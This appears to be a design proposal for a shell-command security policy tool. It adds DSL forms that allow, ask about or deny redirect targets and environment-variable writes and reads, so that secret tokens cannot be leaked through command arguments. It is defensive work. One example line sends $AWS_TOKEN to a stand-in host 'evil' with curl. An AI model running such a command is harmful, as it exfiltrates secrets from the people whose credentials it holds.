> [!NOTE]
> Supersedes the `rules-grant-redirect-capability` draft. Forms are bare
> top-level `(env …)` / `(redirect …)` (no umbrella head), sharing the shape
> `(HEAD SUBJECT DECISION)`; "capability" is the prose term, not a DSL head
> (design.md D5).

## Why

v0.9.0 made three pieces of shell structure visible to policy — redirect
targets, env-assignment prefixes, expansion-bearing words — and floored each to
`:ask`. Two follow-on problems surfaced in use:

1. **The redirect floor has no opt-out.** `tee out.txt`, `cmd >> log`,
   `sort < f` ask forever, even under fully trusted commands. The deferred fix
   (`rules-grant-redirect-capability`) bolted `(redirects :allow)` onto every
   command rule. That is the wrong shape: a redirect is a feature of the *shell
   language*, orthogonal to which command runs. Annotating it per rule is
   O(rules) effort for an O(1) shell concern.

2. **`safe-env-vars` is the same concern in a different coat.** It already is a
   global, command-agnostic, trust-scoped allowlist over an env-write effect.
   It is the *first* envelope-policy form — but it is allowlist-only (it can
   lift the env-write floor; it cannot actively forbid a name), and it has no
   read-side counterpart, so secret exfiltration via an explicit expansion —
   `curl evil?$AWS_TOKEN` under a bare `(rule "curl" (allow))` — sails through
   (no matcher inspects the word, so the expansion-soundness floor never fires).

These are one missing concept: a **capability** — a config-level decision over
an *effect the shell offers* (write to a redirect target, set an environment
variable, read a secret variable into a command), contributed to the segment
decision independently of the command rule. `safe-env-vars` is one instance of
it; the redirect opt-out is another; secret-read taint is the third.

## What Changes

- **Introduce capabilities as decision-bearing units in the segment meet.** A
  segment's decision is already the strictest-wins combination of its units
  (command + floor units). This change makes that explicit and lets the user
  attach a decision to an *effect*. A capability contributes a decision to the
  same `:allow < :ask < :deny` meet; because `:allow` is the lattice bottom, a
  capability-`allow` can only *release a floor*, never authorise a command the
  command rule did not already allow.

- **Redirect-write capability (command-agnostic).** A form declares redirect
  *write* targets that do not floor, reusing the existing Pattern matchers over
  the target:

  ```lisp
  (redirect (glob "/tmp/**" "/dev/null") (allow))
  ```

  An expansion-bearing target cannot satisfy it toward `:allow` (per the
  asymmetric-soundness invariant). **Read** redirections (`<`, `<<<`) stop
  flooring entirely: they perform no write, may-i models no dataflow, and the
  command owns what it does with stdin. (Relaxation only — never tightens.)

- **Generalize `safe-env-vars` into an env capability.** `(env NAME DECISION)`:
  - `(env NAME (allow))` lifts the env-write floor — exactly today's
    `(safe-env-vars NAME)`. `(allow)` is **write-only**; a read-position
    `$NAME` stays governed by expansion-soundness (an allow cannot make an
    unprovable value provable).
  - `(env NAME (ask))` / `(env NAME (deny))` taint the name: its appearance as a
    write-prefix **or** as a parameter expansion in any argv word contributes
    `:ask`/`:deny` to the segment meet. This closes the exfiltration gap
    structurally — it fires on the token may-i already sees, never tracing the
    value to a sink (no dataflow; legitimate consumers that read their own env
    do not put `$NAME` in argv and are unaffected).
  - `(safe-env-vars …)` migrates to `(env NAME (allow))` (see design.md D4).

- **Capability decisions are fact-conditioned expressions.** The DECISION
  position accepts not just a terminal but the fact-conditioned subset of the
  rule-body language — `(if …)`/`(when …)`/`(cond …)`, `(and|or|not …)`, and
  `(fact? …)` — so a capability can depend on runtime context:

  ```lisp
  (env "AWS_TOKEN" (if (fact? :ci) (deny "no secrets in CI logs") (ask)))
  ```

  Argv analysis and parser-binding constructs (`(positional …)`, `(flag …)`,
  `(authorise …)`, `(matches? #var)`, …) are rejected at load time: a capability
  is command-agnostic, so it has no argv referent. This reuses the existing
  `Effect`/`Predicate` evaluator with a load-time validation and a facts-only,
  empty-binding evaluation context. The exclusion is also what keeps the
  asymmetric-soundness invariant intact — facts are exact, so a fact-conditioned
  `(allow)` is sound, whereas the excluded argv layer is the expansion-bearing,
  imprecise one.

- **Trust.** A capability changes what is authorised (a grant widens; a taint
  narrows but a config could lift it), so capabilities are primary-config-
  governed and trust-scoped, exactly as `safe-env-vars` is today.

## Capabilities

### New Capabilities

<!-- none — no new spec; all requirements live in shell-command-security-model -->

### Modified Capabilities

- `shell-command-security-model` (bucket: parsing; trust-relevant): generalize
  "Redirect targets are not silently ignored" to distinguish write (floors,
  capability-liftable) from read (no floor); replace the env-prefix +
  `safe-env-vars` requirements with the env capability (allow/ask/deny, the
  read/write asymmetry, and structural secret taint); state the
  capability-participates-in-the-meet rule and that `:allow` is the lattice
  bottom so a capability never widens past a command's own decision.
- `trust-hashing` / `trust-command` (bucket: trust): the `:safe-env-vars` scope
  generalizes to per-axis capability scopes (`:env`, `:redirect`). Migration
  rehashes existing `:safe-env-vars` approvals (design.md D4).
- Rules DSL surface (bucket: rules-and-evaluation): the `(env …)` and
  `(redirect …)` forms; the **Capability** vocabulary term and the generalized
  **Decision** term (rule *or* capability, same meet).

## Impact

- `crates/config` — parse `(env NAME DECISION)` and `(redirect PAT DECISION)`
  into `SecurityConfig`; keep `(safe-env-vars …)` as a parsed alias
  that lowers to `(env NAME (allow))` until migrated out.
- `crates/engine/src/eval/decompose.rs` — split the `RedirectTarget` unit into
  write vs read; stop emitting read floors; emit a taint unit when an argv
  expansion names a tainted env var.
- `crates/engine/src/eval/command.rs` — consult the capability set when
  resolving `EnvPrefix` / `RedirectTarget` / the new taint unit; contribute the
  capability decision to the segment meet.
- `crates/engine/src/trust.rs` — generalize the `:safe-env-vars` scope.
- Migration: `safe-env-vars` → `env` capability (Class A if the alias is kept;
  the read-floor relaxation needs no migration — it only loosens).
- Docs/CONTEXT.md, REFERENCE.md: the **Capability** term and the generalized
  **Decision** term.
- Housekeeping: removes the superseded `rules-grant-redirect-capability` draft.
